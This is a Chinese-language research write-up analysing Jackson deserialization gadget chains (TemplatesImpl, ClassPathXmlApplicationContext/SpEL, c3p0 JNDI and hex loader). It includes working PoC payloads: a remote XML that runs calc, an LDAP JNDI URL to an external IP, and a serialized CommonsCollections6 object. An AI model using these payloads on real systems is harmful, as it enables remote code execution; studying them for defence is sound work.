# Jackson反序列化各种链子



## TemplatesImpl利用链（CVE-2017-7525）

### 影响版本

Jackson 2.6系列 < 2.6.7.1

Jackson 2.7系列 < 2.7.9.1

Jackson 2.8系列 < 2.8.8.1

### 环境

```xml
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.7.9</version>
        </dependency>
```

我使用的是JDK7u21。

### POC

```json
{
    "object":[
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        {
            "transletBytecodes":["Base64exp"],
            "transletName":"feng",
            "outputProperties":{}
        }
    ]
}
```

### 分析

了解过fastjson的TemplatesImpl的链子的话，会知道fastjson在`setValue`里面调用了`getOutputProperties`方法，导致了rce，jackson同样如此。

之所以会触发get，之前fastjson中关于getter的触发也提到了：

**get开头的方法要求如下：**

- 方法名长度大于等于4
- 非静态方法
- 以get开头且第4个字母为大写
- 无传入参数
- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

就因为`返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong`。

```java
public synchronized Properties getOutputProperties() {
    
    class Properties extends Hashtable<Object,Object> {
```

jackson中似乎同样有这样的处理。

```java
            do {
                p.nextToken();
                SettableBeanProperty prop = _beanProperties.find(propName);

                if (prop != null) { // normal case
                    try {
                        prop.deserializeAndSet(p, ctxt, bean);
                    } catch (Exception e) {
                        wrapAndThrow(e, bean, propName, ctxt);
                    }
                    continue;
                }
                handleUnknownVanilla(p, ctxt, bean, propName);
            } while ((propName = p.nextFieldName()) != null);
```

处理`outputProperties`的时候得到的`prop`是`SetterlessProperty`，之后调用`SetterlessProperty.deserializeAndSet`：

```java
        // Ok: then, need to fetch Collection/Map to modify:
        Object toModify;
        try {
            toModify = _getter.invoke(instance);
```

调用了`getter`。

至于`Bytecodes`和`name`都是通过setter。

至于为什么名字也改了，因为：

```java
    private synchronized void setTransletBytecodes(byte[][] bytecodes) {
        _bytecodes = bytecodes;
    }
```

```java
    protected synchronized void setTransletName(String name) {
        _name = name;
    }
```



具体的流程自己debug跟了，跟之前反序列化的流程差不多。

```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.xml.internal.security.utils.Base64;


public class MyTest {
    public static void main(String[] args) throws Exception{
        String exp = Base64.encode(SerializeUtil.getEvilCode());
        exp = exp.replace("\n","");
        String jsonInput = aposToQuotes("{\"object\":['com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "{\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'feng',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "]\n" +
                "}");
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(jsonInput, Feng.class);
    }
    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}

```

高版本JDK不行的原因我没有去实际尝试，mi1k7ea师傅的文章中说是因为`_factory`在jackson中不能解析。具体哪些Java版本需要自行测试。

### 修复

`createBeanDeserializer()`里面检测黑名单：

```java
    protected void checkIllegalTypes(DeserializationContext ctxt, JavaType type, BeanDescription beanDesc) throws JsonMappingException {
        String full = type.getRawClass().getName();
        if (this._cfgIllegalClassNames.contains(full)) {
            ctxt.reportBadTypeDefinition(beanDesc, "Illegal type (%s) to deserialize: prevented for security reasons", new Object[]{full});
        }

    }
```



```
Invalid type definition for type Lcom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl;: Illegal type (com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) to deserialize: prevented for security reasons
```



# ClassPathXmlApplicationContext利用链（CVE-2017-17485）

### 影响版本

Jackson 2.7系列 < 2.7.9.2

Jackson 2.8系列 < 2.8.11

Jackson 2.9系列 < 2.9.4

### 环境

这里我用的JDK8：

```xml
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>2.7.9</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>2.7.9</version>
        </dependency>
```

还需要有Spring的依赖，pom写依赖即可。

### POC

```
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1:39876/spel.xml"]
```

spel.xml：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg value="calc.exe" />
        <property name="whatever" value="#{ pb.start() }"/>
    </bean>
</beans>
```

### 分析

简单提一下的，利用的并不是什么setter和getter，而是因为这样传参，会把参数Sring作为构造器的参数传入，导致调用：

```java
	public ClassPathXmlApplicationContext(String configLocation) throws BeansException {
		this(new String[] {configLocation}, true, null);
	}
```

跟进：

```java
	public ClassPathXmlApplicationContext(String[] configLocations, boolean refresh, ApplicationContext parent)
			throws BeansException {

		super(parent);
		setConfigLocations(configLocations);
		if (refresh) {
			refresh();
		}
	}
```

调用`refresh()`，之后就是spring读取xml文件进行bean的相关处理（我没学过Spring，这部分也没太懂。。。）

最后就是一个SpEL表达式注入：

```java
		else if (value instanceof TypedStringValue) {
			// Convert value to target type here.
			TypedStringValue typedStringValue = (TypedStringValue) value;
			Object valueObject = evaluate(typedStringValue);
			try {
```

```java
	protected Object evaluateBeanDefinitionString(String value, BeanDefinition beanDefinition) {
		if (this.beanExpressionResolver == null) {
			return value;
		}
		Scope scope = (beanDefinition != null ? getRegisteredScope(beanDefinition.getScope()) : null);
		return this.beanExpressionResolver.evaluate(value, new BeanExpressionContext(this, scope));
	}
```



很明显能看出来这种利用需要能出网。





## c3p0利用链

jackson的利用链太多了就不一一看了，最后再看一下比较特殊的c3p0的2给链子，一个是JNDI注入另外一个是c3p0的不出网利用。所以jackson有2种不出网的链子，一种是`TemplatesImpl`，另外一个就是`c3p0`。

```xml
        <dependency>
            <groupId>com.mchange</groupId>
            <artifactId>c3p0</artifactId>
            <version>0.9.5.2</version>
        </dependency>
```



### JNDI注入链

```java
["com.mchange.v2.c3p0.JndiRefForwardingDataSource", {"jndiName":"ldap://121.5.169.223:1389/k2isjv", "loginTimeout":0}]
```

```java
        String payload = "[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\", {\"jndiName\":\"ldap://121.5.169.223:1389/k2isjv\", \"loginTimeout\":0}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payload, Object.class);
```

先调用`setJndiName`设置`jndiName`：

```java
	public void setJndiName( Object jndiName ) throws PropertyVetoException
	{
		Object oldVal = this.jndiName;
		if ( ! eqOrBothNull( oldVal, jndiName ) )
			vcs.fireVetoableChange( "jndiName", oldVal, jndiName );
		this.jndiName = (jndiName instanceof Name ? ((Name) jndiName).clone() : jndiName /* String */);
		if ( ! eqOrBothNull( oldVal, jndiName ) )
			pcs.firePropertyChange( "jndiName", oldVal, jndiName );
	}
```

然后调用`setLoginTimeout`：

```java
    public void setLoginTimeout(int seconds) throws SQLException
    { inner().setLoginTimeout( seconds ); }
```

跟进`inner()`：

```java

    private synchronized DataSource inner() throws SQLException
    {
	if (cachedInner != null)
	    return cachedInner;
	else
	    {
		DataSource out = dereference();
		if (this.isCaching())
		    cachedInner = out;
		return out;
	    }
    }
```

因为没设置`cachedInner`所以为null，跟进`dereference()`：

```java
    private DataSource dereference() throws SQLException
    {
	Object jndiName = this.getJndiName();
	Hashtable jndiEnv = this.getJndiEnv();
	try
	    {
		InitialContext ctx;
		if (jndiEnv != null)
		    ctx = new InitialContext( jndiEnv );
		else
		    ctx = new InitialContext();
		if (jndiName instanceof String)
		    return (DataSource) ctx.lookup( (String) jndiName );
		else if (jndiName instanceof Name)
		    return (DataSource) ctx.lookup( (Name) jndiName );
		else
		    throw new SQLException("Could not find ConnectionPoolDataSource with " +
					   "JNDI name: " + jndiName);
	    }
```

这。。。没啥好说的了，JNDI注入。



### hex序列化字节加载器

c3p0里面也提到了，具体看C3P0来构造即可。

打CC6：

```java
package com.summer.jackson;


import com.fasterxml.jackson.databind.ObjectMapper;
import com.summer.util.SerializeUtil;
import java.util.*;

public class Jackson {
    public static void main(String[] args) throws Exception{
        byte[] evil = Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=");
        String hexString = bytesToHexString(evil,evil.length);
        String poc = "{\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",{\"userOverridesAsString\":\"HexAsciiSerializedMap:"+ hexString + ";\"}]}";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(poc, Feng.class);

    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);
        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}

```

